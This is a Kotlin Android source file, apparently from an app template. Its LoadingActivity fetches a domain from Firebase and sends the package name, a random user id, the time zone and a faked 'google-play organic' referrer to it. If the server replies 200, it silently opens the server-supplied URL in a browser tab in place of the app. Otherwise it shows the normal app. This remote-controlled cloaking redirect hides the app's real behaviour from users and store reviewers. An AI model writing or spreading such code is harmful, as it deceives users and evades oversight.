package com.template

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.webkit.WebSettings
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.browser.customtabs.CustomTabsIntent
import androidx.browser.customtabs.CustomTabsIntent.COLOR_SCHEME_DARK
import com.google.android.material.snackbar.Snackbar
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import okhttp3.*
import java.io.IOException
import java.util.*

class LoadingActivity : AppCompatActivity() {
    lateinit var prefs:SharedPreferences
    private lateinit var database: DatabaseReference
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)
        prefs = getSharedPreferences("localData", MODE_PRIVATE)
        if(isOnline(this)) {
            when (prefs.getInt("urlCode", 0)) {
                0 -> {
                    val uuid = UUID.randomUUID()
                    val timeZone = TimeZone.getDefault().id
                    var domen: String?
                    var link: String
                    database = Firebase.database.reference
                    database.child("db").child("link").get().addOnSuccessListener {
                        domen = it.value.toString()
                        if(!domen.isNullOrEmpty()) {
                            link = "$domen/?packageid=${packageName}&usserid=${uuid}&getz=${timeZone}&getr=utm_source=google-play&utm_medium=organic"
                            openUrlFromServer(link)
                        }else{
                            nextActivity(MainActivity::class.java)
                        }
                    }
                }
                200 -> openCCT(prefs.getString("url", "https://www.google.com").toString())
                else -> {
                    nextActivity(MainActivity::class.java)
                }
            }
        }
        else {
            nextActivity(MainActivity::class.java)
        }
    }
    private fun openUrlFromServer(url:String){
        if(url.startsWith("http")) {
            val client = OkHttpClient.Builder()
                .addNetworkInterceptor { chain ->
                    chain.proceed(
                        chain.request()
                            .newBuilder()
                            .header("User-Agent", WebSettings.getDefaultUserAgent(this))
                            .build()
                    )
                }
                .build()
            val request = Request.Builder().url(url).build()
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    prefs.edit().putInt("urlCode", 403).apply()
                }

                override fun onResponse(call: Call, response: Response) {
                    prefs.edit().putInt("urlCode", response.code).apply()
                    if (response.code == 200) {
                        val urlFromServer = response.body!!.string()
                        prefs.edit().putString("url", urlFromServer).apply()
                        openCCT(urlFromServer)
                    } else {
                        nextActivity(MainActivity::class.java)
                    }
                }
            })
        }
        else {
            prefs.edit().putInt("urlCode", 403).apply()
            nextActivity(MainActivity::class.java)
        }
    }
    private fun openCCT(url:String){
        try {
            val CCTBuilder: CustomTabsIntent.Builder = CustomTabsIntent.Builder()
            CCTBuilder.setColorScheme(COLOR_SCHEME_DARK)
            val CCTIntent: CustomTabsIntent = CCTBuilder.build()
            CCTIntent.launchUrl(this, Uri.parse(url))
            finish()
        }catch (_:Exception){
            nextActivity(MainActivity::class.java)
        }
    }
    private fun nextActivity(activity: Class<*>) {
        val intent = Intent(this, activity)
        startActivity(intent)
        finish()
    }

    private fun isOnline(context: Context): Boolean {
        val systemService: Any = context.getSystemService(CONNECTIVITY_SERVICE)
        return (systemService as ConnectivityManager).activeNetworkInfo != null
    }
}